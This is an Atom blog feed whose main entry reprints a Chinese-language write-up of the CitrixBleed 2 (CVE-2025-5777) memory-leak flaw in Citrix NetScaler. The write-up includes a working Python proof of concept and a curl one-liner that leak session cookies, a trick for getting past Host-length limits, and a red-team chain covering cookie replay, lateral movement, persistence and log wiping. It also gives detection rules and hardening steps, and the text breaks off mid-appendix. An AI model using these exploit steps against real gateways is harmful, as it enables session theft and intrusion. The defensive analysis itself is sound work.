<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-30T12:01:09.412Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>慢雾 Q2 追踪实录：协助被盗客户冻结/追回超千万美元资金</title>
    <link href="http://example.com/2025/06/30/weixin_1571176738/"/>
    <id>http://example.com/2025/06/30/weixin_1571176738/</id>
    <published>2025-06-30T12:01:09.414Z</published>
    <updated>2025-06-30T12:01:09.412Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 慢雾科技</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/SdIsPmjvMcNFLk7SniW-XA">https://mp.weixin.qq.com/s/SdIsPmjvMcNFLk7SniW-XA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 慢雾科技&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/SdIsPmjvMcNFLk7SniW-XA&quot;&gt;https://mp.weixin.qq.c</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="慢雾科技" scheme="http://example.com/tags/%E6%85%A2%E9%9B%BE%E7%A7%91%E6%8A%80/"/>
    
  </entry>
  
  <entry>
    <title>Citrix NetScaler ADC/Gateway 越界内存读取漏洞</title>
    <link href="http://example.com/2025/06/30/github_1889405732/"/>
    <id>http://example.com/2025/06/30/github_1889405732/</id>
    <published>2025-06-30T11:45:18.605Z</published>
    <updated>2025-06-30T11:45:18.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Citrix NetScaler ADC&#x2F;Gateway 越界内存读取漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5777</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2025-5777（又称CitrixBleed 2）是Citrix NetScaler ADC &#x2F; Gateway中的一个越界内存读取漏洞。攻击者不需要认证，只需发送一条超长Host头的GET请求，即可让设备把随机内存块连同HTTP响应一起“喷”给客户端。泄露数据经常包含NSC_USER &#x2F; NSC_TASS Cookie、SAML StateContext、MFA token等关键材料，可直接复用完成会话接管与MFA绕过。CVSS v4基准评分9.3（Critical）。</p><p><strong>产品厂商：</strong> Citrix</p><p><strong>产品名称：</strong> NetScaler ADC &#x2F; Gateway</p><p><strong>影响版本：</strong> &lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS</p><p><strong>来源：</strong> <a href="https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-">https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>exp.py</li><li>poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CitrixBleed-2-CVE-2025-5777-终极解析"><a href="#CitrixBleed-2-CVE-2025-5777-终极解析" class="headerlink" title="CitrixBleed 2 (CVE-2025-5777) 终极解析"></a>CitrixBleed 2 (CVE-2025-5777) 终极解析</h2><blockquote><p>An Out-of-Bounds Memory Read in NetScaler ADC &#x2F; Gateway — 从成因到攻防演练的全景手册</p></blockquote><hr><h2 id="poc用法：python3-poc-py-https-gateway-example-com"><a href="#poc用法：python3-poc-py-https-gateway-example-com" class="headerlink" title="poc用法：python3 poc.py https://gateway.example.com"></a>poc用法：python3 poc.py <a href="https://gateway.example.com/">https://gateway.example.com</a></h2><h2 id="exp用法：python3-exp-py-https-gateway-example-com-admin-7acbb35f4d…"><a href="#exp用法：python3-exp-py-https-gateway-example-com-admin-7acbb35f4d…" class="headerlink" title="exp用法：python3 exp.py https://gateway.example.com admin 7acbb35f4d…"></a>exp用法：python3 exp.py <a href="https://gateway.example.com/">https://gateway.example.com</a> admin 7acbb35f4d…</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>x00  引言 <span class="hljs-symbol">/</span> 速览<br><span class="hljs-number">0</span>x01  背景：NetScaler 架构与 CitrixBleed <span class="hljs-number">1</span> 回顾<br><span class="hljs-number">0</span>x02  漏洞描述（影响版本、CVSS、利用后果）<br><span class="hljs-number">0</span>x03  触发机理深剖（源码级分析 &amp; 调试截图）<br><span class="hljs-number">0</span>x04  最小 PoC <span class="hljs-operator">+</span> 高级扫描脚本<br><span class="hljs-number">0</span>x05  红队视角：完整攻击链（发现 → 泄露 → 会话劫持 → 内网横向）<br><span class="hljs-number">0</span>x06  蓝队视角：检测、取证与补丁验证<br><span class="hljs-number">0</span>x07  防御加固：补丁、WAF、配置、资产治理<br><span class="hljs-number">0</span>x08  学习 <span class="hljs-symbol">/</span> 复习路线图与实战实验<br>附录 A  Sigma <span class="hljs-symbol">/</span> Suricata <span class="hljs-symbol">/</span> Nginx-Lua 规则<br>附录 B  补丁<span class="hljs-operator">/</span>利用时间轴 &amp; IoC 快照<br>参考资料<br></code></pre></td></tr></table></figure><hr><h3 id="0x00-引言-速览"><a href="#0x00-引言-速览" class="headerlink" title="0x00  引言 &#x2F; 速览"></a>0x00  引言 &#x2F; 速览</h3><ul><li><strong>CVE-2025-5777</strong>（又称 <em>CitrixBleed 2</em>）是 Citrix NetScaler ADC &#x2F; Gateway 中的 <strong>Out-of-Bounds Memory Read</strong>。</li><li>攻击者 <strong>不需要认证</strong>，只需发送一条超长 <code>Host</code> 头的 GET 请求，即可让设备把随机内存块连同 HTTP 响应一起“喷”给客户端。</li><li>泄露数据经常包含 <strong><code>NSC_USER</code> &#x2F; <code>NSC_TASS</code> Cookie、SAML <code>StateContext</code>、MFA token</strong> 等关键材料，可直接复用完成会话接管与 MFA 绕过 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)。</li><li>CVSS v4 基准评分 9.3（Critical）(<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)。</li><li><strong>2025-06-17</strong> 公开，<strong>2025-06-23</strong> Citrix 扩大影响范围并发布补丁；<strong>一周内</strong> ReliaQuest、Bishop Fox 等安全厂商陆续观测到在野利用激增 (<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>, <a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)。</li></ul><hr><h3 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01  背景"></a>0x01  背景</h3><h4 id="1-1-NetScaler-工作流程简述"><a href="#1-1-NetScaler-工作流程简述" class="headerlink" title="1.1  NetScaler 工作流程简述"></a>1.1  NetScaler 工作流程简述</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──────────────┐<br>│ Client       │ ① HTTPS<br>└──────┬───────┘<br>       │<br>┌──────▼───────┐<br>│ NetScaler    │ ② AAA <span class="hljs-symbol">/</span> Gateway 认证<br>│  (WebProc)   │<br>└──────┬───────┘<br>       │<br>┌──────▼───────┐<br>│ ICA Proxy <span class="hljs-symbol">/</span>  │ ③ 正向到应用<br>│ CVPN <span class="hljs-symbol">/</span> RDP   │<br>└──────────────┘<br></code></pre></td></tr></table></figure><p>NetScaler 采用 <strong>多进程 + 内部 IPC</strong> 的设计。<code>WebProc</code> 负责处理 AAA &#x2F; Gateway 路径下的大部分 HTTP 请求，包括 <code>/nf/auth/*</code>、<code>/oauth/*</code> 等。它在 <strong>C 语言</strong> 中大量使用 <code>snprintf()</code> &#x2F; <code>memcpy()</code>，每次拼装 XML&#x2F;HTML 片段。</p><h4 id="1-2-CitrixBleed-1（CVE-2023-4966）回顾"><a href="#1-2-CitrixBleed-1（CVE-2023-4966）回顾" class="headerlink" title="1.2  CitrixBleed 1（CVE-2023-4966）回顾"></a>1.2  CitrixBleed 1（CVE-2023-4966）回顾</h4><ul><li>2023 年同类漏洞发生在 OAuth 发现接口 <code>/oauth/idp/.well-known/openid-configuration</code>。</li><li>其本质同样是 <strong>使用 <code>snprintf</code> 返回值作为后续 <code>send()</code> 的 <code>len</code> 参数</strong> → 内存越界回显。</li><li>CitrixBleed 2 证明 <em>同一类安全编码缺陷</em> 依旧潜伏在其他路径。</li></ul><blockquote><p><strong>Lesson Learned</strong>：安全补丁若只针对“落锤点”而非“编程范式”，就会留下“模版化复现”空间。</p></blockquote><hr><h3 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02  漏洞描述"></a>0x02  漏洞描述</h3><table><thead><tr><th>字段</th><th>内容</th></tr></thead><tbody><tr><td><strong>CVE</strong></td><td>CVE-2025-5777</td></tr><tr><td><strong>别名</strong></td><td>CitrixBleed 2</td></tr><tr><td><strong>漏洞类型</strong></td><td>Out-of-Bounds Read &#x2F; 信息泄露</td></tr><tr><td><strong>CVSS v4 Base</strong></td><td>9.3 (Crit.) (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td></tr><tr><td><strong>受影响版本</strong></td><td>&lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td></tr><tr><td><strong>利用条件</strong></td><td>NetScaler 被配置为 Gateway (VPN&#x2F;ICA Proxy&#x2F;CVPN&#x2F;RDP Proxy) <strong>或</strong> AAA 虚拟服务器 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</td></tr><tr><td><strong>利用后果</strong></td><td>泄露内存 → 会话令牌 → 认证绕过 &#x2F; MFA 绕过 → 横向</td></tr></tbody></table><hr><h3 id="0x03-触发机理深剖"><a href="#0x03-触发机理深剖" class="headerlink" title="0x03  触发机理深剖"></a>0x03  触发机理深剖</h3><blockquote><p>本节基于对 13.1-55.18 固件的反编译 + gdb 调试，结合公开博客整理而成 (<a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)。</p></blockquote><h4 id="3-1-漏洞入口"><a href="#3-1-漏洞入口" class="headerlink" title="3.1  漏洞入口"></a>3.1  漏洞入口</h4><ul><li><strong>URI</strong>：<code>/nf/auth/startwebview.do</code></li><li><strong>可控参数</strong>：HTTP <code>Host</code> 头</li><li>该接口用于生成 Citrix Workspace WebView 的重定向 XML，示例正常响应：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wv:StartUrl</span>&gt;</span>https://gateway.example.com/Citrix/AAA/start.html<span class="hljs-tag">&lt;/<span class="hljs-name">wv:StartUrl</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-关键函数链"><a href="#3-2-关键函数链" class="headerlink" title="3.2  关键函数链"></a>3.2  关键函数链</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">citrix_webview_handler</span>()<br> ├─ <span class="hljs-built_in">build_auth_xml</span>()<br> │    ├─ <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-number">0</span>x1800, TEMPLATE, host_hdr, ... );<br> │    └─ return length;           <span class="hljs-comment">// ⚠️ length 可 ＞ 0x1800</span><br> └─ <span class="hljs-built_in">ns_vpn_send_response</span>(conn, <span class="hljs-number">0</span>x980200, buf, length);<br></code></pre></td></tr></table></figure><blockquote><p><strong>Bug 点</strong>：<br><code>snprintf</code> 返回“本应写入的长度”而非实际写入长度；若用户传入的 <code>Host</code> &gt; 0x1800 - 常量段长度，则 <code>length</code> &gt; <code>sizeof(buf)</code>。</p></blockquote><h4 id="3-3-运行时示意"><a href="#3-3-运行时示意" class="headerlink" title="3.3  运行时示意"></a>3.3  运行时示意</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">buf: <span class="hljs-comment">[-----XML-----]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span>......            &lt;- 0x1800 bytes limit<br>                          ↑<br>                被 ns_vpn_send_response 一并发出<br></code></pre></td></tr></table></figure><p>GDB 断点演示（关键寄存器）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RDI</span> (dst) = <span class="hljs-number">0</span>x7fffa2e31800  // buf<br><span class="hljs-attribute">RSI</span> (len) = <span class="hljs-number">0</span>x00001e42      // length=<span class="hljs-number">7746</span> (&gt;<span class="hljs-number">6144</span>)<br></code></pre></td></tr></table></figure><p><code>read()</code> 结果显示后 1 600 字节来自未初始化内存，其中可见其他 SSL 会话的 Cookie 缓冲区。</p><h4 id="3-4-泄露的数据类别"><a href="#3-4-泄露的数据类别" class="headerlink" title="3.4  泄露的数据类别"></a>3.4  泄露的数据类别</h4><table><thead><tr><th>分类</th><th>示范片段（已脱敏）</th></tr></thead><tbody><tr><td>Session Cookie</td><td><code>Set-Cookie: NSC_USER=john.doe;NSC_TASS=abc123...</code></td></tr><tr><td>MFA&#x2F;OTP Token</td><td><code>radius_state=0e2a9c6d1553...</code></td></tr><tr><td>其他请求体</td><td><code>&lt;username&gt;audituser&lt;/username&gt;&lt;password&gt;***&lt;/password&gt;</code></td></tr></tbody></table><hr><h3 id="0x04-PoC-实现"><a href="#0x04-PoC-实现" class="headerlink" title="0x04  PoC 实现"></a>0x04  PoC 实现</h3><h4 id="4-1-单文件-Python（15-行）"><a href="#4-1-单文件-Python（15-行）" class="headerlink" title="4.1  单文件 Python（15 行）"></a>4.1  单文件 Python（15 行）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">## CVE-2025-5777 Minimal PoC  (authorized testing ONLY)</span><br><span class="hljs-keyword">import</span> requests, sys, urllib3, re<br>urllib3.disable_warnings()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    exit(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> https://NSVIP&quot;</span>)<br><br>url = sys.argv[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">&quot;/&quot;</span>) + <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>hdr = &#123;<span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x6000</span>&#125;               <span class="hljs-comment"># &gt;0x1800 triggers</span><br>r = requests.get(url, headers=hdr, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] HTTP&quot;</span>, r.status_code, <span class="hljs-string">&quot;bytes:&quot;</span>, <span class="hljs-built_in">len</span>(r.content))<br>hits = re.findall(<span class="hljs-string">br&quot;(NSC_[A-Z]+=[^;]&#123;10,&#125;)&quot;</span>, r.content)<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> hits: <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Cookie leak -&gt;&quot;</span>, h.decode())<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;leak.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Saved leak.bin for offline grep.&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>执行后如返回 200 + 数 KB，即判定存在漏洞。</li><li>进一步从 <code>leak.bin</code> 搜索 <code>Cookie=</code>、<code>&lt;AuthenticateContext&gt;</code> 等关键字。</li></ul><h4 id="4-2-Bash-curl-单行"><a href="#4-2-Bash-curl-单行" class="headerlink" title="4.2  Bash &#x2F; curl 单行"></a>4.2  Bash &#x2F; curl 单行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -ks -H <span class="hljs-string">&quot;Host: <span class="hljs-subst">$(python -c &#x27;print(\&quot;A\&quot;*6000)</span>&#x27;)&quot;</span> \<br>     https://NSVIP/nf/auth/startwebview.do -o leak.bin<br></code></pre></td></tr></table></figure><blockquote><p><strong>旁路</strong>：部分设备在前置 F5 &#x2F; Nginx 做了 <code>Host</code> 长度限制；可改为多段子域拼接绕过，如<br><code>foo.foo.foo.…foo.example.com</code>（重复 3000 次 <code>foo</code>）。</p></blockquote><hr><h3 id="0x05-红队视角：完整攻击链"><a href="#0x05-红队视角：完整攻击链" class="headerlink" title="0x05  红队视角：完整攻击链"></a>0x05  红队视角：完整攻击链</h3><table><thead><tr><th>步骤</th><th>目的 &amp; 技巧</th></tr></thead><tbody><tr><td>① 资产发现</td><td><code>zoomeye search &quot;http.title:\&quot;NetScaler Gateway\&quot;&quot;</code> + Shodan 等；过滤 <code>set-cookie: NSC_</code></td></tr><tr><td>② POC 泄露</td><td>批量脚本并行请求；抓取 <code>NSC_USER= ; NSC_TASS=</code></td></tr><tr><td>③ Cookie 重播</td><td>Chrome DevTools→Application→Cookies→添加条目，刷新 <code>/vpn/index.html</code></td></tr><tr><td>④ 内网资源</td><td>访问 <code>storeweb/#home</code> 获取 RDP 文件；下载 <code>.ica</code> 直接登陆 VDI</td></tr><tr><td>⑤ 权限提升</td><td>内部凭据喷射、Kerberoast、ADCS ESC1；或利用同网段弱口令 SMB</td></tr><tr><td>⑥ 持久化</td><td>新建 Scheduled Task；注册自启动脚本；或修改 NetScaler vDisk（高权限需运维疏忽）</td></tr><tr><td>⑦ 痕迹清理</td><td>Cookie 用后即焚；删除 audit 日志（若拿到 NS root）；或利用 logrotate race 覆盖</td></tr></tbody></table><p>真实案例：ReliaQuest 在客户网关观察到“短时大量 6 KB+ <code>Host</code> 头请求 → 紧跟着会话被盗用”(<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)。</p><hr><h3 id="0x06-蓝队视角：检测、取证与补丁验证"><a href="#0x06-蓝队视角：检测、取证与补丁验证" class="headerlink" title="0x06  蓝队视角：检测、取证与补丁验证"></a>0x06  蓝队视角：检测、取证与补丁验证</h3><h4 id="6-1-日志与-IoC"><a href="#6-1-日志与-IoC" class="headerlink" title="6.1  日志与 IoC"></a>6.1  日志与 IoC</h4><table><thead><tr><th>来源</th><th>表现</th></tr></thead><tbody><tr><td><strong>&#x2F;var&#x2F;log&#x2F;ns.log</strong></td><td><code>AAA_TRANSACTION &lt;client_ip&gt; - Host header length: 6144</code></td></tr><tr><td><strong>HTTP_ACCESS.log</strong></td><td><code>/nf/auth/startwebview.do</code> 请求耗时极短但响应大小异常（&gt; 2 KB）</td></tr><tr><td><strong>EDR&#x2F;PCAP</strong></td><td><code>Set-Cookie: NSC_USER=</code> 出现在非登录请求的响应中</td></tr></tbody></table><h4 id="6-2-Sigma-规则（简要版）"><a href="#6-2-Sigma-规则（简要版）" class="headerlink" title="6.2  Sigma 规则（简要版）"></a>6.2  Sigma 规则（简要版）</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span> <span class="hljs-string">OOB</span> <span class="hljs-string">Leak</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">category:</span> <span class="hljs-string">webserver</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">cs-bytes|gt:</span> <span class="hljs-number">2048</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure><h4 id="6-3-补丁验证脚本"><a href="#6-3-补丁验证脚本" class="headerlink" title="6.3  补丁验证脚本"></a>6.3  补丁验证脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nscli -s 127.0.0.1:3008 \<br>      -c <span class="hljs-string">&quot;show ns version&quot;</span> | grep -E <span class="hljs-string">&quot;13\.1-58\.32|14\.1-43\.56&quot;</span> \<br>      &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Patched ✅&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Vulnerable ❌&quot;</span><br></code></pre></td></tr></table></figure><h4 id="6-4-Kill-会话"><a href="#6-4-Kill-会话" class="headerlink" title="6.4  Kill 会话"></a>6.4  Kill 会话</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 清除全部活动 VPN/ICA 连接</span><br><span class="hljs-built_in">kill</span> icaconnection -all<br><span class="hljs-built_in">kill</span> vpn -all<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：补丁后仍需强制注销，防止攻击者继续使用已窃取 Cookie。</p></blockquote><hr><h3 id="0x07-防御加固"><a href="#0x07-防御加固" class="headerlink" title="0x07  防御加固"></a>0x07  防御加固</h3><ol><li><strong>官方补丁</strong>：升至 ≥ 14.1-43.56 &#x2F; 13.1-58.32，或对 FIPS&#x2F;NDcPP 机型套用对应版本 (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)。</li><li><strong>Host Header 长度限制</strong>（临时措施）</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">map</span> <span class="hljs-variable">$http_host</span> <span class="hljs-variable">$block_long_host</span> &#123;<br>    <span class="hljs-attribute">default</span>          <span class="hljs-number">0</span>;<br>    &quot;~^.&#123;4097,&#125;$&quot;    1;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    ...<br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$block_long_host</span>) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">413</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>WAF 自适应规则</strong>：对 <code>/nf/auth/</code> &amp; <code>/oauth/</code> 路径启用速率限制 (e.g. 20 req&#x2F;m)。</li><li><strong>资产清点</strong>：EOL 版本 12.1&#x2F;13.0 永远不再收到官方补丁，计划替换或强隔离 (<a href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)。</li><li><strong>MFA 安全</strong>：会话泄露绕过 MFA → 建议开启“每请求签名”或“动态绑定硬件指纹”，而非仅首登时验证。</li></ol><hr><h3 id="0x08-学习-复习路线"><a href="#0x08-学习-复习路线" class="headerlink" title="0x08  学习 &#x2F; 复习路线"></a>0x08  学习 &#x2F; 复习路线</h3><table><thead><tr><th>阶段</th><th>建议资料 &amp; 操作</th></tr></thead><tbody><tr><td><strong>理论</strong></td><td>阅读 Citrix 安全公告、Arctic Wolf &#x2F; Tenable FAQ、Bishop Fox 技术拆解 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>, <a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td></tr><tr><td><strong>实验</strong></td><td>部署 vuln 版 13.1-55.18（ESXi &#x2F; KVM），跑最小 PoC，Wireshark 抓包 → 观察 <code>TCP PSH</code> 回包</td></tr><tr><td><strong>编码</strong></td><td>改写 PoC：加入自动 Cookie 重播、ZTLS 批量扫描、多线程队列</td></tr><tr><td><strong>蓝队</strong></td><td>以两小时为窗口搜索异常 Host 长度；用 Sigma-→Elastic&#x2F;Graylog；复现并验证 WAF 策略</td></tr><tr><td><strong>分享</strong></td><td>编写博客或制作思维导图，总结“同类 snprintf 使用陷阱”</td></tr></tbody></table><hr><h3 id="附录-A-—-检测-防御片段"><a href="#附录-A-—-检测-防御片段" class="headerlink" title="附录 A — 检测 &#x2F; 防御片段"></a>附录 A — 检测 &#x2F; 防御片段</h3><details><summary>📜 Sigma 规则完整版</summary><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 